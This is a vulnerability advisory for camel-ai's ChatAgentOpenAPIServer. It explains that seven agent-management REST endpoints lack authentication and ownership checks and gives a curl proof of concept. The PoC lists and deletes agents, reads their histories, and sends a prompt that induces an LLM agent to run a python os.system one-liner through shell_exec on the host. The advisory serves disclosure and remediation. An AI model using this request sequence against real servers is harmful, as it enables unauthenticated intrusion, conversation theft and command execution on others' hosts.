# CAMEL ChatAgentOpenAPIServer serves all agent-management endpoints without authentication, enabling unauthenticated remote code execution when shell tools are registered (CWE-306, CVSS 9.8)

## Summary

ChatAgentOpenAPIServer in camel-ai 0.2.91a5 registers seven REST endpoints for creating and managing ChatAgent instances (init, step, astep, list_agent_ids, history, reset, delete) with no authentication middleware and no per-route authorization. Any client that can reach the served port can, without any credential, enumerate all agent IDs, read every agent's conversation history including tool-call results, and create, reset, or delete arbitrary agents. When a host-executing tool such as TerminalToolkit's `shell_exec` is registered, the same unauthenticated access extends to arbitrary command execution on the host.

## Details

`ChatAgentOpenAPIServer` (camel/services/agent_openapi_server.py:96) builds a FastAPI application and maps agent IDs to live `ChatAgent` instances:

```python
# camel/services/agent_openapi_server.py:134 -- the application is created
# with no authentication middleware of any kind
self.app = FastAPI(title="CAMEL OpenAPI-compatible Server")
```

A grep of the whole module finds no authentication-related import or middleware: the only fastapi imports are `APIRouter`, `FastAPI`, and `HTTPException`. Seven routes are registered under `/v1/agents` (agent_openapi_server.py:189-372), none of which declares an authentication dependency:

```python
# camel/services/agent_openapi_server.py:189 and :372
router = APIRouter(prefix="/v1/agents")
...
self.app.include_router(router)

# the seven route declarations between :191 and :355:
#   :191  @router.post("/init")
#   :249  @router.post("/astep/{agent_id}")
#   :283  @router.get("/list_agent_ids")
#   :292  @router.post("/delete/{agent_id}")
#   :308  @router.post("/step/{agent_id}")
#   :340  @router.post("/reset/{agent_id}")
#   :355  @router.get("/history/{agent_id}")
```

The request schema itself acknowledges that access control is not implemented:

```python
# camel/services/agent_openapi_server.py:68-69
agent_id: str  # Required: explicitly set agent_id to
# support future multi-agent and permission control
```

Every agent-scoped handler performs only an agent-id existence check and no ownership validation (:205, :261, :302, :319, :350, :365), so any client can act on any agent -- `GET /history/{agent_id}` returns the full conversation of that agent, including system prompts and tool-call results.

Two further properties compose the missing authentication into host command execution:

1. `/init` attaches any tool named in `tools_names` from the operator-configured registry (agent_openapi_server.py:221-229). When the operator registers `TerminalToolkit.shell_exec`, an unauthenticated client creates an agent with host command execution attached.
2. `shell_exec` hands the command to the host shell: with `safe_mode` at its default `True` (terminal_toolkit.py:112; TerminalToolkit defaults to the local, non-Docker backend, terminal_toolkit.py:109), a `python -c` payload passes the inspection (`DANGEROUS_COMMANDS`, camel/toolkits/terminal_toolkit/utils.py:62-112, lists 41 system-administration commands and no script interpreter), and the command then runs through `subprocess.Popen(command, ..., shell=True)` (terminal_toolkit.py:752-762).

**Why this is a vulnerability:**

- *"It only becomes reachable if the operator serves it."* Stated plainly: the class defines no network launcher and no default host binding -- the bundled example (examples/services/agent_openapi_server.py) drives it through an in-process FastAPI `TestClient`. But the serving step is equally unguarded: nothing in the library authenticates, warns, or restricts it, so the moment the app is served (`uvicorn server:app --host 0.0.0.0 --port 8000`), all seven endpoints are open to every client that can reach the port. A security boundary that the library provides no built-in mechanism to enable is not an operator configuration choice. Missing authentication on AI-infrastructure management APIs is scored Critical in prior CVE records: CVE-2025-63389 (Ollama, 9.8) and CVE-2026-21445 (Langflow, 9.1).
- *"The RCE needs an LLM, so this is prompt injection."* No LLM takes part in Part A below: every endpoint answers unauthenticated requests, and the two step routes are proven unauthenticated by a bogus-agent-id probe -- the handler runs and answers `{"detail":"Agent not found."}` with no 401/403 challenge. In Part B the LLM is the tool's intended caller; the defect is server-side (no authentication, no ownership check) and is independent of prompt content. The unauthenticated client also chooses the agent's `system_message` at `/init`, so the tool-calling persona is attacker-defined.
- *"Agents are per-user objects; touching another agent is a business error, not a security one."* The handlers keep no identity binding whatsoever, so there is no legitimate owner the check could ever succeed for: any unauthenticated client can read every conversation and destroy every agent.
- *"The operator chose to register the tool."* Registering a tool in the in-process catalog is not an exposure decision: the operator configures the catalog, but which agents receive a tool is chosen per request by the unauthenticated client via `tools_names` (agent_openapi_server.py:221-229).

**Suggested remediation:**

1. Require an authentication dependency on the router (API key or token middleware) and reject unauthenticated clients before routing.
2. Bind agent ownership to the authenticated identity and enforce it in every handler (currently only existence is checked).
3. Default-deny loading of host-executing tools (e.g. `shell_exec`) through `/init`, or require an explicit operator allowlist plus per-call confirmation.

## Proof of Concept

Dynamically verified against camel-ai 0.2.91a5 (PyPI; Python 3.11; Windows 11 host); the vulnerable module ships byte-identical in the latest stable release 0.2.90. Part A (zero-auth access to all seven endpoints, no LLM involved) was re-verified on 2026-09-01: 9/9 automated assertions passing. Part B (LLM-driven `shell_exec` execution on the host) was dynamically verified on 2026-08-11: 13/13 automated assertions passing, DeepSeek as the agent's model backend, marker written under the OS temp directory.

**Setup:** `pip install "camel-ai==0.2.91a5" "mcp<2" fastapi uvicorn`. Two dependency notes: a current `mcp` 2.x release breaks the unbounded `mcp>=1.3.0` pin of camel-ai 0.2.91a5 at the `camel.toolkits` import (the `mcp<2` pin restores a working release); and `fastapi` is not a base dependency -- it ships only in camel-ai's optional extras (`web_tools` and the aggregate `all`), while the ChatAgentOpenAPIServer module imports it directly (uvicorn arrives transitively via `mcp`).

Operator side -- registering the tool is an operator choice; the placeholder key only creates the model backend object and is never exercised by Part A:

```python
# server.py
from camel.services.agent_openapi_server import ChatAgentOpenAPIServer
from camel.toolkits import TerminalToolkit
from camel.toolkits.function_tool import FunctionTool

toolkit = TerminalToolkit()
server = ChatAgentOpenAPIServer(
    tool_registry={"shell_exec": [FunctionTool(toolkit.shell_exec)]},
)
app = server.app  # ASGI application for uvicorn
```

```bash
export DEEPSEEK_API_KEY="sk-poc-FAKE-REPLACE-ME"   # agent's model backend
uvicorn server:app --host 0.0.0.0 --port 8000

# --- attacker side: no credential of any kind ---
TARGET=http://127.0.0.1:8000

# 1) enumerate every agent -- no auth header
curl -s "$TARGET/v1/agents/list_agent_ids"
# -> {"agent_ids":[]}

# 2) create an agent with the host command-execution tool attached
curl -s -X POST "$TARGET/v1/agents/init" \
  -H 'Content-Type: application/json' \
  -d '{"agent_id":"poc_a","model_platform":"deepseek","model_type":"deepseek-chat","tools_names":["shell_exec"],"system_message":"You are a helper agent."}'
# -> {"agent_id":"poc_a","message":"Agent initialized."}

# 3) read that agent's full conversation history
curl -s "$TARGET/v1/agents/history/poc_a"
# -> 200, the message list (system prompt included)

# 4) reset the agent's memory
curl -s -X POST "$TARGET/v1/agents/reset/poc_a"
# -> {"message":"Agent poc_a reset."}

# 5) the two step routes carry no authentication either: a bogus agent id
#    reaches the handler and is answered 404 -- never a 401/403 challenge
curl -s -X POST "$TARGET/v1/agents/step/nonexistent" \
  -H 'Content-Type: application/json' -d '{"input_message":"hi"}'
# -> {"detail":"Agent not found."}
curl -s -X POST "$TARGET/v1/agents/astep/nonexistent" \
  -H 'Content-Type: application/json' -d '{"input_message":"hi"}'
# -> {"detail":"Agent not found."}

# 6) Part B (this technique verified 2026-08-11; payload shown in portable
#    tempfile.gettempdir() form): drive the agent to run a host command.
#    The reply arrives under "msgs" after ~5-15 s and its
#    info.tool_calls[0].tool_name is "shell_exec".
curl -s -X POST "$TARGET/v1/agents/step/poc_a" \
  -H 'Content-Type: application/json' \
  -d '{"input_message":"I need to verify my python toolchain works on this machine. Use the shell_exec tool to run exactly this python command: python -c \"import os,tempfile; p=os.path.join(tempfile.gettempdir(),\u0027poc_marker\u0027); os.system(\u0027echo POC_EXECUTED > \u0027+p); print(p)\". It prints the marker path when done."}'

# the command reached the host shell through shell=True: the marker file
# exists under the OS temp directory with content POC_EXECUTED

# 7) destroy any agent
curl -s -X POST "$TARGET/v1/agents/delete/poc_a"
# -> {"message":"Agent poc_a deleted."}
```

Notes: the induced one-liner prints its own marker path and derives it from `tempfile.gettempdir()` (on Windows `%TEMP%`, on POSIX `/tmp`), so the payload carries no per-OS path assumption.

## Impact

- **Type:** Missing authentication on critical agent-management functions (CWE-306), plus missing per-agent authorization/ownership checks (CWE-862). When a host-executing tool such as `shell_exec` is registered, the unauthenticated access composes into unauthenticated remote code execution.
- **Who is impacted:** any operator serving `ChatAgentOpenAPIServer` (the library's own service component) -- every unauthenticated network client that can reach the port; and any application embedding the class in a multi-tenant service, where tenants can read each other's conversations and delete each other's agents.
- **Attacker capabilities** (each observed dynamically with no credential at any step):
  - enumerate every active agent ID (`/list_agent_ids`);
  - read any agent's full conversation history, including system prompts and tool-call results (`/history`);
  - create unlimited agents, each a full `ChatAgent` instantiated against the operator's LLM account (`/init`);
  - reset or delete any agent (`/reset`, `/delete`);
  - with `shell_exec` registered: execute arbitrary commands on the host with the privileges of the CAMEL process (`/init` + `/step` driving `shell_exec`, Part B).
- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = 9.8 (Critical).
  - AV:N -- remote: any unauthenticated client that can reach the served port.
  - AC:L -- plain HTTP requests, no race or special conditions; re-verified repeatedly.
  - PR:N / UI:N -- there is no authentication to bypass and no victim interaction; the only "user" is the attacker's own request.
  - S:U -- the impact is confined to the security authority of the vulnerable component: the CAMEL service process and the agent-management function it exposes. This matches the NVD scoring of comparable unauthenticated AI-infrastructure exposures (CVE-2025-63389, 9.8, identical vector).
  - C:H / I:H / A:H -- read every conversation; create/reset/delete agents; delete all agents. These hold even for a deployment that registers no tools at all; host file read/write and destructive command execution additionally require a host-executing tool such as `shell_exec` to be registered.

**Scope note (alternate scoring).** If the host-shell command execution is assessed as escaping the component's security authority (S:C), the same vector scores **10.0** (Critical). Both values were computed with the official FIRST CVSS v3.1 formula: ISS = 1-(1-0.56)^3 = 0.914816; Impact(S:U) = 6.42x0.914816 = 5.8731, Impact(S:C) = 7.52x(0.914816-0.029) - 3.25x(0.914816-0.02)^15 = 6.0477; Exploitability = 8.22x0.85x0.77x0.85x0.85 = 3.8870; Base(S:U) = round-up(5.8731+3.8870) = 9.8; Base(S:C) = round-up(min(1.08x(6.0477+3.8870), 10)) = 10.0.

## Affected products

| Field | Value |
|------|------|
| **Ecosystem** | `pip` |
| **Package name** | `camel-ai` |
| **Affected versions** | `>= 0.2.71a3, <= 0.2.91a5` |
| **Patched versions** | `None` |

## Severity

| Field | Value |
|------|------|
| **Severity** | `Critical` |
| **Vector string** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Score** | `9.8` |

Recalculation record (official FIRST CVSS v3.1 formula script):

```
PRIMARY   CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  ISS=0.914816  Impact=5.873119  Exploitability=3.887043  Base=9.8  (Critical)
ALTERNATE CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
  ISS=0.914816  Impact=6.047730  Exploitability=3.887043  Base=10.0 (Critical)
```

## Weaknesses

| # | CWE | Name | Rationale |
|:--:|------|------|------|
| 1 (primary) | CWE-306 | Missing Authentication for Critical Function | The application is created with no authentication middleware (agent_openapi_server.py:134) and none of the seven `/v1/agents` endpoints (:189-372) declares an authentication dependency, leaving critical agent-management functions open to unauthenticated clients (verified in source and confirmed dynamically on 2026-09-01) |
| 2 | CWE-862 | Missing Authorization | Every agent-scoped handler performs only an agent-id existence check and no ownership validation (:205, :261, :302, :319, :350, :365), so any unauthenticated client can act on any agent |
